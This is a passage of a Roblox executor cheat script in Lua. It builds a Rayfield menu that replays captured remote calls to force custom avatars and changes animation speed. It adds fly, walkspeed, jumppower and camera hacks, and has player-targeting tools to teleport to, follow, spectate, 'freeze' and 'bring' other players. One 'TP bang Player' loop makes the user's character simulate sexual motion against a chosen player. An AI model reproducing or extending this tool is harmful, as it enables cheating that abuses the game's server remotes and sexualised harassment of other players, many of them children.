        ["HeadScale"] = 1,
        ["HeightScale"] = 1.25,
        ["RightLeg"] = 82777528032059,
        ["LeftLeg"] = 121864110805253
    }
}

game:GetService("ReplicatedStorage").FunctionConnections.NewAESaveAvatar:InvokeServer(unpack(args))

   end,
})

local Button = Tab:CreateButton({
   Name = "cat fit 2",
   Callback = function()
               local args = {
    [1] = {
        ["SwimAnimation"] = 0;
        ["WalkAnimation"] = 0;
        ["ProportionScale"] = 0.511454701423645;
        ["RightLegColor"] = {
            [1] = "248.0000004172325";
            [2] = "248.0000004172325";
            [3] = "248.0000004172325";
        };
        ["HatAccessory"] = "98144560652085";
        ["Torso"] = 111532289455125;
        ["JumpAnimation"] = 0;
        ["IdleAnimation"] = 0;
        ["BodyTypeScale"] = 0.5962028503417969;
        ["ClimbAnimation"] = 0;
        ["Shirt"] = 11335258282;
        ["Emotes"] = {
            ["1"] = {
                [1] = 14548709888;
            };
            ["8"] = {
                [1] = 5915776835;
            };
            ["3"] = {
                [1] = 10370922566;
            };
            ["2"] = {
                [1] = 12874468267;
            };
            ["5"] = {
                [1] = 7466046574;
            };
            ["4"] = {
                [1] = 11753545334;
            };
            ["7"] = {
                [1] = 4646306583;
            };
            ["6"] = {
                [1] = 4689362868;
            };
        };
        ["GraphicTShirt"] = 0;
        ["RightArmColor"] = {
            [1] = "248.0000004172325";
            [2] = "248.0000004172325";
            [3] = "248.0000004172325";
        };
        ["RightLeg"] = 131359873709031;
        ["WidthScale"] = 1.0517624616622925;
        ["Pants"] = 4080983570;
        ["RightArm"] = 126637196984684;
        ["FallAnimation"] = 0;
        ["Head"] = 0;
        ["LeftLegColor"] = {
            [1] = "248.0000004172325";
            [2] = "248.0000004172325";
            [3] = "248.0000004172325";
        };
        ["Face"] = 15432080;
        ["LeftArmColor"] = {
            [1] = "248.0000004172325";
            [2] = "248.0000004172325";
            [3] = "248.0000004172325";
        };
        ["LeftLeg"] = 104113560860424;
        ["HeadColor"] = {
            [1] = "248.0000004172325";
            [2] = "248.0000004172325";
            [3] = "248.0000004172325";
        };
        ["TorsoColor"] = {
            [1] = "248.0000004172325";
            [2] = "248.0000004172325";
            [3] = "248.0000004172325";
        };
        ["DepthScale"] = 1.0188917815685272;
        ["LeftArm"] = 98964144815454;
        ["HeadScale"] = 1;
        ["HeightScale"] = 0.986021101474762;
        ["RunAnimation"] = 0;
        ["WaistAccessory"] = "120583292739858";
    };
}

game:GetService("ReplicatedStorage"):WaitForChild("FunctionConnections", 9e9):WaitForChild("NewAESaveAvatar", 9e9):InvokeServer(unpack(args))
   end,
})

Tab:CreateButton({
    Name = "Kid",
    Callback = function()
-- Script generated by SimpleSpy - credits to exx#9394

local args = {
    [1] = 2,
    [2] = true
}

game:GetService("ReplicatedStorage").FunctionConnections.NewAERequestSetCheesyEffect:InvokeServer(unpack(args))
    end
})

local Button = Tab:CreateButton({
   Name = "weird avatar",
   Callback = function()
        -- Script generated by SimpleSpy - credits to exx#9394

local args = {
    [1] = {
        ["SwimAnimation"] = 1018554245,
        ["Torso"] = 10966673552,
        ["ProportionScale"] = 0.68,
        ["ClimbAnimation"] = 1090134016,
        ["Shirt"] = 144076436,
        ["FaceAccessory"] = "8923599923,11101973939",
        ["RightArmColor"] = {
            [1] = "248.0000004172325",
            [2] = "248.0000004172325",
            [3] = "248.0000004172325"
        },
        ["HairAccessory"] = "6564213921,7175904988,7961311720",
        ["RightArm"] = 2962663610,
        ["Head"] = 746767604,
        ["FallAnimation"] = 1018552770,
        ["TorsoColor"] = {
            [1] = "248.0000004172325",
            [2] = "248.0000004172325",
            [3] = "248.0000004172325"
        },
        ["DepthScale"] = 1.25,
        ["RightLeg"] = 9175317035,
        ["HeightScale"] = 1.25,
        ["LeftLeg"] = 9175315737,
        ["RightLegColor"] = {
            [1] = "248.0000004172325",
            [2] = "248.0000004172325",
            [3] = "248.0000004172325"
        },
        ["LeftLegColor"] = {
            [1] = "248.0000004172325",
            [2] = "248.0000004172325",
            [3] = "248.0000004172325"
        },
        ["JumpAnimation"] = 619511974,
        ["BodyTypeScale"] = 0.5,
        ["ShouldersAccessory"] = "14024342720",
        ["LeftArmColor"] = {
            [1] = "248.0000004172325",
            [2] = "248.0000004172325",
            [3] = "248.0000004172325"
        },
        ["Emotes"] = {
            ["1"] = {
                [1] = 11309263077
            },
            ["8"] = {
                [1] = 11435177473
            },
            ["3"] = {
                [1] = 4849499887
            },
            ["2"] = {
                [1] = 3823158750
            },
            ["5"] = {
                [1] = 11753545334
            },
            ["4"] = {
                [1] = 7466046574
            },
            ["7"] = {
                [1] = 10370922566
            },
            ["6"] = {
                [1] = 5915776835
            }
        },
        ["Pants"] = 144076512,
        ["HeadColor"] = {
            [1] = "248.0000004172325",
            [2] = "248.0000004172325",
            [3] = "248.0000004172325"
        },
        ["WidthScale"] = 1.25,
        ["Face"] = 0,
        ["AccessoryBlob"] = {
            [1] = {
                ["AccessoryType"] = "Jacket",
                ["Order"] = 10,
                ["IsLayered"] = true,
                ["Puffiness"] = 0.550000011920929,
                ["AssetId"] = 11450182334
            },
            [2] = {
                ["AccessoryType"] = "Pants",
                ["Order"] = 4,
                ["IsLayered"] = true,
                ["Puffiness"] = 0,
                ["AssetId"] = 11162779515
            },
            [3] = {
                ["AccessoryType"] = "Shirt",
                ["Order"] = 8,
                ["IsLayered"] = true,
                ["Puffiness"] = 0.25,
                ["AssetId"] = 10235226324
            }
        },
        ["WaistAccessory"] = "11420192906",
        ["NeckAccessory"] = "6414371617,5591898874",
        ["WalkAnimation"] = 5319909330,
        ["IdleAnimation"] = 1018553897,
        ["LeftArm"] = 2962661848,
        ["HeadScale"] = 1.25,
        ["GraphicTShirt"] = 0,
        ["RunAnimation"] = 1018548665,
        ["HatAccessory"] = "5891588282,7097472405,7033033419"
    }
}

game:GetService("ReplicatedStorage").FunctionConnections.NewAESaveAvatar:InvokeServer(unpack(args))
   end,
})

local Button = Tab:CreateButton({
   Name = "weird avatar 2",
   Callback = function()
        -- Script generated by SimpleSpy - credits to exx#9394

local args = {
    [1] = {
        ["SwimAnimation"] = 5319927054,
        ["Torso"] = 10966673552,
        ["ProportionScale"] = 0.01,
        ["ClimbAnimation"] = 5319931619,
        ["Shirt"] = 13982475876,
        ["FaceAccessory"] = "11101973939",
        ["RightArmColor"] = {
            [1] = "248.0000004172325",
            [2] = "248.0000004172325",
            [3] = "248.0000004172325"
        },
        ["HairAccessory"] = "6216526940",
        ["RightArm"] = 11572079320,
        ["Head"] = 134082579,
        ["FallAnimation"] = 5319914476,
        ["TorsoColor"] = {
            [1] = "248.0000004172325",
            [2] = "248.0000004172325",
            [3] = "248.0000004172325"
        },
        ["DepthScale"] = 0.925,
        ["RightLeg"] = 9175317035,
        ["HeightScale"] = 0.85,
        ["LeftLeg"] = 9175315737,
        ["RightLegColor"] = {
            [1] = "248.0000004172325",
            [2] = "248.0000004172325",
            [3] = "248.0000004172325"
        },
        ["LeftLegColor"] = {
            [1] = "248.0000004172325",
            [2] = "248.0000004172325",
            [3] = "248.0000004172325"
        },
        ["JumpAnimation"] = 5319917561,
        ["BodyTypeScale"] = 0.2,
        ["RunAnimation"] = 5319900634,
        ["LeftArmColor"] = {
            [1] = "248.0000004172325",
            [2] = "248.0000004172325",
            [3] = "248.0000004172325"
        },
        ["Emotes"] = {
            ["1"] = {
                [1] = 12507097350
            },
            ["8"] = {
                [1] = 13823339506
            },
            ["3"] = {
                [1] = 4646306583
            },
            ["2"] = {
                [1] = 4689362868
            },
            ["5"] = {
                [1] = 11309263077
            },
            ["4"] = {
                [1] = 7202898984
            },
            ["7"] = {
                [1] = 14353421343
            },
            ["6"] = {
                [1] = 3823158750
            }
        },
        ["Pants"] = 13982473101,
        ["HeadColor"] = {
            [1] = "248.0000004172325",
            [2] = "248.0000004172325",
            [3] = "248.0000004172325"
        },
        ["HatAccessory"] = "6076612186",
        ["WidthScale"] = 1,
        ["AccessoryBlob"] = {
            [1] = {
                ["AccessoryType"] = "Shirt",
                ["Order"] = 8,
                ["IsLayered"] = true,
                ["Puffiness"] = 0.25,
                ["AssetId"] = 9491351513
            },
            [2] = {
                ["AccessoryType"] = "Pants",
                ["Order"] = 4,
                ["IsLayered"] = true,
                ["Puffiness"] = 0,
                ["AssetId"] = 13914402249
            },
            [3] = {
                ["AccessoryType"] = "Jacket",
                ["Order"] = 10,
                ["IsLayered"] = true,
                ["Puffiness"] = 0.550000011920929,
                ["AssetId"] = 11450182334
            }
        },
        ["NeckAccessory"] = "11466857481",
        ["WalkAnimation"] = 5319909330,
        ["IdleAnimation"] = 5319922112,
        ["Face"] = 0,
        ["HeadScale"] = 0.85,
        ["GraphicTShirt"] = 0,
        ["LeftArm"] = 10966663299,
        ["WaistAccessory"] = "6472198409"
    }
}

game:GetService("ReplicatedStorage").FunctionConnections.NewAESaveAvatar:InvokeServer(unpack(args))
   end,
})

local Button = Tab:CreateButton({
   Name = "e girl",
   Callback = function()
       -- Script generated by SimpleSpy - credits to exx#9394

local args = {
    [1] = {
        ["SwimAnimation"] = 2510240941,
        ["Torso"] = 4637151279,
        ["ProportionScale"] = 0,
        ["ClimbAnimation"] = 2510230574,
        ["Shirt"] = 11289085978,
        ["FaceAccessory"] = "13353986061,12580366888,8923599923",
        ["RightArmColor"] = {
            [1] = "248.0000004172325",
            [2] = "248.0000004172325",
            [3] = "248.0000004172325"
        },
        ["HairAccessory"] = "13918965164,14314838611",
        ["RightArm"] = 0,
        ["Head"] = 0,
        ["FallAnimation"] = 2510233257,
        ["TorsoColor"] = {
            [1] = "248.0000004172325",
            [2] = "248.0000004172325",
            [3] = "248.0000004172325"
        },
        ["DepthScale"] = 0.8,
        ["RightLeg"] = 0,
        ["HeightScale"] = 0.9,
        ["WaistAccessory"] = "14335771887",
        ["RightLegColor"] = {
            [1] = "248.0000004172325",
            [2] = "248.0000004172325",
            [3] = "248.0000004172325"
        },
        ["LeftLegColor"] = {
            [1] = "248.0000004172325",
            [2] = "248.0000004172325",
            [3] = "248.0000004172325"
        },
        ["WidthScale"] = 0.7,
        ["BodyTypeScale"] = 0,
        ["BackAccessory"] = "8651335862",
        ["LeftArmColor"] = {
            [1] = "248.0000004172325",
            [2] = "248.0000004172325",
            [3] = "248.0000004172325"
        },
        ["Emotes"] = {
            ["1"] = {
                [1] = 9528286240
            },
            ["8"] = {
                [1] = 12874468267
            },
            ["3"] = {
                [1] = 7466046574
            },
            ["2"] = {
                [1] = 11309263077
            },
            ["4"] = {
                [1] = 3576968026
            },
            ["7"] = {
                [1] = 13344121112
            }
        },
        ["Pants"] = 14851012835,
        ["JumpAnimation"] = 2510236649,
        ["HatAccessory"] = "12579341301,13142881183,1402432199",
        ["LeftArm"] = 0,
        ["LeftLeg"] = 0,
        ["HeadColor"] = {
            [1] = "248.0000004172325",
            [2] = "248.0000004172325",
            [3] = "248.0000004172325"
        },
        ["WalkAnimation"] = 2510242378,
        ["IdleAnimation"] = 2510235063,
        ["RunAnimation"] = 2510238627,
        ["HeadScale"] = 1,
        ["Face"] = 0,
        ["AccessoryBlob"] = {
            [1] = {
                ["Order"] = 1,
                ["AssetId"] = 12090385963,
                ["AccessoryType"] = "Jacket"
            }
        },
        ["GraphicTShirt"] = 10891067215
    }
}

game:GetService("ReplicatedStorage").FunctionConnections.NewAESaveAvatar:InvokeServer(unpack(args))

   end,
})

local Tab = Window:CreateTab("Messup Anim", 7564719393) -- Title, Image

local Button = Tab:CreateButton({
   Name = "Loop Animation",
   Callback = function()
game.Players.LocalPlayer.Character.Animate.Disabled = true
   end,
})

local Button = Tab:CreateButton({
   Name = "Unloop Animation",
   Callback = function()
game.Players.LocalPlayer.Character.Animate.Disabled = false
   end,
})

local Input = Tab:CreateInput({
   Name = "Animation Speed",
   CurrentValue = "",
   PlaceholderText = "enter speed",
   RemoveTextAfterFocusLost = false,
   Flag = "Input1",
   Callback = function(value)
     local giga = game.Players.LocalPlayer.Character
    local liga = giga:FindFirstChildOfClass("Humanoid") or Char:FindFirstChildOfClass("AnimationController")

    for i,v in next, liga:GetPlayingAnimationTracks() do
        v:AdjustSpeed(value)
    end
   end,
})

local Button = Tab:CreateButton({
   Name = "Double speed",
   Callback = function()
 local giga = game.Players.LocalPlayer.Character
    local liga = giga:FindFirstChildOfClass("Humanoid") or Char:FindFirstChildOfClass("AnimationController")

    for i,v in next, liga:GetPlayingAnimationTracks() do
        v:AdjustSpeed(v.Speed * 2)
    end
   end,
})

local Button = Tab:CreateButton({
   Name = "Decrease speed",
   Callback = function()
local giga = game.Players.LocalPlayer.Character
    local liga = giga:FindFirstChildOfClass("Humanoid") or Char:FindFirstChildOfClass("AnimationController")

    for i,v in next, liga:GetPlayingAnimationTracks() do
        v:AdjustSpeed(v.Speed * 0.5)
    end
   end,
})

local Tab = Window:CreateTab("Server", 7734053426) -- Title, Image

-- Import the Players service
local Players = game:GetService("Players")
local LocalPlayer = Players.LocalPlayer
local Camera = workspace.CurrentCamera
local RunService = game:GetService("RunService")

-- Helper function to get a player's character
local function getPlayerCharacter(playerName)
    local targetPlayer = Players:FindFirstChild(playerName)
    return targetPlayer and targetPlayer.Character or nil
end

-- Helper function to display notifications
local function notify(title, content)
    Rayfield:Notify({
        Title = title,
        Content = content,
        Duration = 5,
    })
end

-- Function to get the list of players with usernames and display names
local function getPlayerNames()
    local names = {}
    for _, player in ipairs(Players:GetPlayers()) do
        if player ~= LocalPlayer then
            table.insert(names, player.Name .. " (" .. player.DisplayName .. ")")
        end
    end
    return names
end

-- Variables for toggles
local selectedPlayer = nil
local followActive = false
local followConnection = nil
local spectating = false

-- Create the input box
local Input = Tab:CreateInput({
   Name = "Player Input",
   CurrentValue = "",
   PlaceholderText = "Enter Player Name or Display Name",
   RemoveTextAfterFocusLost = false,
   Flag = "Input1",
   Callback = function(Text)
       -- Trim whitespace and convert to lowercase for case-insensitive comparison
       local lowerText = Text:lower():gsub("%s+", "") -- Remove any extra spaces
       local targetPlayer = nil

       -- Check all players for a match with the input (partial or full)
       for _, player in ipairs(Players:GetPlayers()) do
           if player.Name:lower():find(lowerText, 1, true) or player.DisplayName:lower():find(lowerText, 1, true) then
               targetPlayer = player
               break
           end
       end

       -- Check if the player was found
       if targetPlayer then
           selectedPlayer = targetPlayer.Name
           notify("Player Selected", "You selected: " .. selectedPlayer)
       else
           selectedPlayer = nil
           notify("No Player Found", "No player with that partial name or display name found.")
       end
   end,
})


-- Create the dropdown
local Dropdown = Tab:CreateDropdown({
    Name = "Select Player",
    Options = getPlayerNames(),
    CurrentOption = nil,
    MultipleOptions = false,
    Flag = "PlayerDropdown",
    Callback = function(Options)
        selectedPlayer = Options[1] and Options[1]:match("^(.-) %(") or nil
        if selectedPlayer then
            notify("Player Selected", "You selected: " .. selectedPlayer)
        else
            notify("Selection Cleared", "No player selected.")
        end
    end,
})

-- Update dropdown when players join or leave
Players.PlayerAdded:Connect(function()
    Dropdown:Set({ Options = getPlayerNames() })
end)

Players.PlayerRemoving:Connect(function()
    Dropdown:Set({ Options = getPlayerNames() })
    if not Players:FindFirstChild(selectedPlayer) then
        selectedPlayer = nil
        notify("Player Left", "The selected player has left the game.")
    end
end)

-- Refresh List Button
Tab:CreateButton({
    Name = "Refresh Player List",
    Callback = function()
        Dropdown:Set({ Options = getPlayerNames() })
        notify("Player List Refreshed", "The player list has been updated.")
    end,
})

-- Teleport Button
Tab:CreateButton({
    Name = "Teleport to Player",
    Callback = function()
        if selectedPlayer then
            local targetCharacter = getPlayerCharacter(selectedPlayer)
            if targetCharacter and targetCharacter:FindFirstChild("HumanoidRootPart") then
                LocalPlayer.Character.HumanoidRootPart.CFrame = targetCharacter.HumanoidRootPart.CFrame + Vector3.new(0, 3, 0)
                notify("Teleported", "You teleported to " .. selectedPlayer)
            else
                notify("Teleport Failed", "Target player not valid.")
            end
        else
            notify("No Player Selected", "Please select a player first.")
        end
    end,
})

-- Follow Player Button
Tab:CreateButton({
    Name = "Follow Player",
    Callback = function()
        if followActive then
            followActive = false
            if followConnection then
                followConnection:Disconnect()
                followConnection = nil
            end
            notify("Follow Stopped", "You are no longer following the player.")
        else
            if selectedPlayer then
                followActive = true
                followConnection = RunService.Stepped:Connect(function()
                    local targetCharacter = getPlayerCharacter(selectedPlayer)
                    if targetCharacter and targetCharacter:FindFirstChild("HumanoidRootPart") and LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("HumanoidRootPart") then
                        LocalPlayer.Character.HumanoidRootPart.CFrame = targetCharacter.HumanoidRootPart.CFrame * CFrame.new(0, 0, 3)
                    else
                        followActive = false
                        if followConnection then
                            followConnection:Disconnect()
                            followConnection = nil
                        end
                        notify("Follow Stopped", "Target player no longer valid.")
                    end
                end)
                notify("Follow Started", "You are now following " .. selectedPlayer)
            else
                notify("No Player Selected", "Please select a player first.")
            end
        end
    end,
})

-- Bring Player Button
Tab:CreateButton({
    Name = "Client Bring Player",
    Callback = function()
        if selectedPlayer then
            local targetCharacter = getPlayerCharacter(selectedPlayer)
            if targetCharacter and targetCharacter:FindFirstChild("HumanoidRootPart") then
                targetCharacter.HumanoidRootPart.CFrame = LocalPlayer.Character.HumanoidRootPart.CFrame + Vector3.new(0, 3, 0)
                notify("Player Brought", "You brought " .. selectedPlayer)
            else
                notify("Bring Failed", "Target player not valid.")
            end
        else
            notify("No Player Selected", "Please select a player first.")
        end
    end,
})

-- Freeze Player Button
Tab:CreateButton({
    Name = "Client Freeze Player",
    Callback = function()
        if selectedPlayer then
            local targetCharacter = getPlayerCharacter(selectedPlayer)
            if targetCharacter and targetCharacter:FindFirstChild("HumanoidRootPart") then
                local isAnchored = targetCharacter.HumanoidRootPart.Anchored
                targetCharacter.HumanoidRootPart.Anchored = not isAnchored
                notify("Freeze Toggled", (isAnchored and "Unfroze" or "Froze") .. " " .. selectedPlayer)
            else
                notify("Freeze Failed", "Target player not valid.")
            end
        else
            notify("No Player Selected", "Please select a player first.")
        end
    end,
})

-- Spectate Player Button
Tab:CreateButton({
    Name = "Spectate Player",
    Callback = function()
        if spectating then
            Camera.CameraSubject = LocalPlayer.Character.Humanoid
            spectating = false
            notify("Spectate Stopped", "You are now spectating yourself.")
        else
            if selectedPlayer then
                local targetCharacter = getPlayerCharacter(selectedPlayer)
                if targetCharacter and targetCharacter:FindFirstChild("Humanoid") then
                    Camera.CameraSubject = targetCharacter.Humanoid
                    spectating = true
                    notify("Spectate Started", "You are now spectating " .. selectedPlayer)
                else
                    notify("Spectate Failed", "Target player not valid.")
                end
            else
                notify("No Player Selected", "Please select a player first.")
            end
        end
    end,
})

-- TP bang Toggle Button with LookAt Functionality
Tab:CreateButton({
    Name = "TP bang Player",
    Callback = function()
        if bangActive then
            bangActive = false
            if bangConnection then
                bangConnection:Disconnect()
                bangConnection = nil
            end
            notify("TP bang Stopped", "stopped banging.")
        else
            if selectedPlayer then
                bangActive = true
                bangConnection = RunService.Stepped:Connect(function()
                    local targetCharacter = getPlayerCharacter(selectedPlayer)
                    if targetCharacter and targetCharacter:FindFirstChild("HumanoidRootPart") and LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("HumanoidRootPart") then
                        -- Get positions
                        local targetPosition = targetCharacter.HumanoidRootPart.Position
                        local myRootPart = LocalPlayer.Character.HumanoidRootPart
                        local direction = (targetPosition - myRootPart.Position).unit

                        -- Move back and forth rapidly
                        myRootPart.CFrame = CFrame.lookAt(myRootPart.Position, targetPosition) -- Face the target
                        myRootPart.CFrame = CFrame.new(targetPosition + direction * 3, targetPosition) -- Move towards the target
                        wait(0.1) -- Wait for a short time
                        myRootPart.CFrame = CFrame.new(targetPosition - direction * 3, targetPosition) -- Move away from the target
                    else
                        bangActive = false
                        if bangConnection then
                            bangConnection:Disconnect()
                            bangConnection = nil
                        end
                        notify("TP bang Stopped", "Target player no longer valid.")
                    end
                end)
                notify("TP bang Started", "'banging' " .. selectedPlayer)
            else
                notify("No Player Selected", "Please select a player first.")
            end
        end
    end,
})

local Tab = Window:CreateTab("Player", 107773970772705) -- Title, Image

local Players = game:GetService("Players")

local player = Players.LocalPlayer
local character = player.Character or player.CharacterAdded:Wait()

local spinSpeed = 10
local isSpinning = false

local function getRoot(character)
    return character:FindFirstChild("HumanoidRootPart")
end

local function createSpin(speed)
    local rootPart = getRoot(character)
    if rootPart then
        for _, v in pairs(rootPart:GetChildren()) do
            if v.Name == "Spinning" then
                v:Destroy()
            end
        end

        local spin = Instance.new("BodyAngularVelocity")
        spin.Name = "Spinning"
        spin.Parent = rootPart
        spin.MaxTorque = Vector3.new(0, math.huge, 0)
        spin.AngularVelocity = Vector3.new(0, speed, 0)
    else
        warn("HumanoidRootPart nÃ£o encontrada.")
    end
end

local function removeSpin()
    local rootPart = getRoot(character)
    if rootPart then
        for _, v in pairs(rootPart:GetChildren()) do
            if v.Name == "Spinning" then
                v:Destroy()
            end
        end
    end
end

local SpinSpeedInput = Tab:CreateInput({
    Name = "Definir Velocidade de RotaÃ§Ã£o",
    CurrentValue = tostring(spinSpeed),
    PlaceholderText = "insira a velocidade de rotaÃ§Ã£o",
    RemoveTextAfterFocusLost = false,
    Flag = "SpinSpeedInput",
    Callback = function(Text)
        local newSpeed = tonumber(Text)
        if newSpeed then
            spinSpeed = newSpeed
            if isSpinning then
                createSpin(spinSpeed)
            end
        else
            warn("Entrada invÃ¡lida. Por favor, insira um nÃºmero.")
        end
    end,
})

local LoseYourselfActive = false

local Toggle = Tab:CreateToggle({
    Name = "Perder-se",
    CurrentValue = false,
    Flag = "ToggleLoseYourself",
    Callback = function(Value)
        if LoseYourselfActive then
            UNLOSEYOURSELF()
        else
            LOSEYOURSELF()
        end
        LoseYourselfActive = not LoseYourselfActive
    end,
})

function LOSEYOURSELF()
    workspace.Gravity = 0

    local humanoid = game.Players.LocalPlayer.Character and game.Players.LocalPlayer.Character:FindFirstChild("Humanoid")
    local rootPart = game.Players.LocalPlayer.Character and getRoot(game.Players.LocalPlayer.Character)

    if humanoid and rootPart then
        humanoid.Sit = true
        task.wait(0.1)
        rootPart.CFrame = rootPart.CFrame * CFrame.Angles(math.pi * 0.5, 0, 0)
        for _, animTrack in ipairs(humanoid:GetPlayingAnimationTracks()) do
            animTrack:Stop()
        end

        for _, v in pairs(rootPart:GetChildren()) do
            if v.Name == "Spinning" then
                v:Destroy()
            end
        end

        local spin = Instance.new("BodyAngularVelocity")
        spin.Name = "Spinning"
        spin.Parent = rootPart
        spin.MaxTorque = Vector3.new(0, math.huge, 0)
        spin.AngularVelocity = Vector3.new(0, 2, 0)
    else
        warn("Humanoid ou HumanoidRootPart nÃ£o encontrados.")
    end
end

function UNLOSEYOURSELF()
    workspace.Gravity = 196.2

    local rootPart = game.Players.LocalPlayer.Character and getRoot(game.Players.LocalPlayer.Character)
    if rootPart then
        for _, v in pairs(rootPart:GetChildren()) do
            if v.Name == "Spinning" then
                v:Destroy()
            end
        end
    end
end

local FLYING = false

local function sFLY()
    FLYING = true
    repeat task.wait() until game.Players.LocalPlayer and game.Players.LocalPlayer.Character and game.Players.LocalPlayer.Character:FindFirstChild("Humanoid")
    local T = game.Players.LocalPlayer.Character.PrimaryPart
    local CONTROL = {F = 0, B = 0, L = 0, R = 0, Q = 0, E = 0}
    local SPEED = 0
    local BG = Instance.new('BodyGyro')
    local BV = Instance.new('BodyVelocity')

    BG.P = 9e4
    BG.Parent = T
    BV.Parent = T
    BG.maxTorque = Vector3.new(9e9, 9e9, 9e9)
    BG.cframe = T.CFrame
    BV.velocity = Vector3.new(0, 0, 0)
    BV.maxForce = Vector3.new(9e9, 9e9, 9e9)

    local userInputService = game:GetService("UserInputService")

    local humanoid = game.Players.LocalPlayer.Character:WaitForChild("Humanoid")
    humanoid:ChangeState(Enum.HumanoidStateType.Physics)
    humanoid.PlatformStand = true

    userInputService.InputBegan:Connect(function(input, gameProcessed)
        if gameProcessed then return end
        if input.UserInputType == Enum.UserInputType.Keyboard then
            if input.KeyCode == Enum.KeyCode.W then CONTROL.F = 1 end
            if input.KeyCode == Enum.KeyCode.S then CONTROL.B = -1 end
            if input.KeyCode == Enum.KeyCode.A then CONTROL.L = -1 end
            if input.KeyCode == Enum.KeyCode.D then CONTROL.R = 1 end
            if input.KeyCode == Enum.KeyCode.Space then CONTROL.E = 1 end
            if input.KeyCode == Enum.KeyCode.LeftControl then CONTROL.Q = -1 end
        end
    end)

    userInputService.InputEnded:Connect(function(input)
        if input.UserInputType == Enum.UserInputType.Keyboard then
            if input.KeyCode == Enum.KeyCode.W then CONTROL.F = 0 end
            if input.KeyCode == Enum.KeyCode.S then CONTROL.B = 0 end
            if input.KeyCode == Enum.KeyCode.A then CONTROL.L = 0 end
            if input.KeyCode == Enum.KeyCode.D then CONTROL.R = 0 end
            if input.KeyCode == Enum.KeyCode.Space then CONTROL.E = 0 end
            if input.KeyCode == Enum.KeyCode.LeftControl then CONTROL.Q = 0 end
        end
    end)

    task.spawn(function()
        repeat task.wait()
            if CONTROL.L + CONTROL.R ~= 0 or CONTROL.F + CONTROL.B ~= 0 or CONTROL.Q + CONTROL.E ~= 0 then
                SPEED = 50
            else
                SPEED = 0
            end

            BV.velocity = ((workspace.CurrentCamera.CFrame.LookVector * (CONTROL.F + CONTROL.B)) +
                            ((workspace.CurrentCamera.CFrame * CFrame.new(CONTROL.L + CONTROL.R, (CONTROL.F + CONTROL.B + CONTROL.Q + CONTROL.E) * 0.2, 0).p) - workspace.CurrentCamera.CFrame.p)) * SPEED
            BG.cframe = workspace.CurrentCamera.CFrame
        until not FLYING
        BG:Destroy()
        BV:Destroy()

        humanoid:ChangeState(Enum.HumanoidStateType.GettingUp)
        humanoid.PlatformStand = false
    end)
end

local function NOFLY()
    FLYING = false
    if game.Players.LocalPlayer.Character and game.Players.LocalPlayer.Character:FindFirstChild("Humanoid") then
        local humanoid = game.Players.LocalPlayer.Character.Humanoid
        humanoid.PlatformStand = false
        humanoid:ChangeState(Enum.HumanoidStateType.GettingUp)
    end
end

local FlyToggle = Tab:CreateToggle({
    Name = "Voar/Desvoar",
    CurrentValue = false,
    Flag = "FlyToggle",
    Callback = function(Value)
        if Value then
            if FLYING == false then
                sFLY()
            end
        else
            if FLYING == true then
                NOFLY()
            end
        end
    end,
})

-- Cria o alternador com uma tecla
local FlyKeybind = Tab:CreateKeybind({
    Name = "Tecla para Voar/Desvoar",
    CurrentKeybind = "F", 
    HoldToInteract = false,
    Flag = "FlyKeybind", 
    Callback = function(Keybind)
        if FLYING then
            NOFLY()
        else
            sFLY()
        end
    end,
})

local Keybind = Tab:CreateKeybind({
    Name = "Tecla para Perder-se",
    CurrentKeybind = "E", 
    HoldToInteract = false,
    Flag = "KeybindLoseYourself",
    Callback = function(Keybind)
        if LoseYourselfActive then
            UNLOSEYOURSELF()
        else
            LOSEYOURSELF()
        end
        LoseYourselfActive = not LoseYourselfActive
    end,
})

local Input = Tab:CreateInput({
   Name = "Walkspeed",
   CurrentValue = "",
   PlaceholderText = "enter walkspeed",
   RemoveTextAfterFocusLost = false,
   Flag = "Input1",
   Callback = function(Value)
   getgenv().WalkSpeedValue = Value; --set your desired walkspeed here
local Player = game:service'Players'.LocalPlayer;
Player.Character.Humanoid:GetPropertyChangedSignal'WalkSpeed':Connect(function()
Player.Character.Humanoid.WalkSpeed = getgenv().WalkSpeedValue;
end)
Player.Character.Humanoid.WalkSpeed = getgenv().WalkSpeedValue;
   end,
})

local Input = Tab:CreateInput({
   Name = "Max Camera Zoom",
   CurrentValue = "",
   PlaceholderText = "enter zoom",
   RemoveTextAfterFocusLost = false,
   Flag = "Input1",
   Callback = function(Value)
        game.Players.LocalPlayer.CameraMaxZoomDistance = (Value)

   end,
})

local Input = Tab:CreateInput({
   Name = "Walkspeed",
   CurrentValue = "",
   PlaceholderText = "enter jumppower",
   RemoveTextAfterFocusLost = false,
   Flag = "Input1",
   Callback = function(Value)
 getgenv().JumpPowerValue = Value; --set your desired walkspeed here
local Player = game:service'Players'.LocalPlayer;
Player.Character.Humanoid:GetPropertyChangedSignal'JumpPower':Connect(function()
Player.Character.Humanoid.JumpPower = getgenv().JumpPowerValue;
end)
Player.Character.Humanoid.JumpPower = getgenv().JumpPowerValue;
   end,
})

local Input = Tab:CreateInput({
   Name = "FOV (Original = 70)",
   CurrentValue = "",
   PlaceholderText = "enter FOV",
   RemoveTextAfterFocusLost = false,
   Flag = "Input1",
   Callback = function(Value)
        game.Players.LocalPlayer.CameraMaxZoomDistance = (Value)

   end,
})

local Button = Tab:CreateButton({
   Name = "CS Resoluiton",
   Callback = function()
   getgenv().Resolution = {
    [".gg/scripters"] = 0.7
}

local Camera = workspace.CurrentCamera
if getgenv().gg_scripters == nil then
    game:GetService("RunService").RenderStepped:Connect(
        function()
            Camera.CFrame = Camera.CFrame * CFrame.new(0, 0, 0, 1, 0, 0, 0, getgenv().Resolution[".gg/scripters"], 0, 0, 0, 1)
        end
    )
end
getgenv().gg_scripters = "Aori0001"
   end,
})

local Button = Tab:CreateButton({
   Name = "Sit",
   Callback = function()
local Players = game:GetService("Players")
local player = Players.LocalPlayer
local character = player.Character or player.CharacterAdded:Wait()
local humanoid = character:WaitForChild("Humanoid")

-- Function to make the character sit
local function makeCharacterSit()
    humanoid.Sit = true
end

-- Call the function to make the character sit
makeCharacterSit()
   end,
})

local Button = Tab:CreateButton({
   Name = "Lay",
   Callback = function()
     local Human = game.Players.LocalPlayer.Character and game.Players.LocalPlayer.Character.Humanoid
     if not Human then
         return
     end
     Human.Sit = true
     task.wait(.1)
     Human.RootPart.CFrame = Human.RootPart.CFrame * CFrame.Angles(math.pi * .5, 0, 0)
     for _, v in ipairs(Human:GetPlayingAnimationTracks()) do
         v:Stop()
     end
   end,
})

local Button = Tab:CreateButton({
   Name = "Dance Stupidly",
   Callback = function()
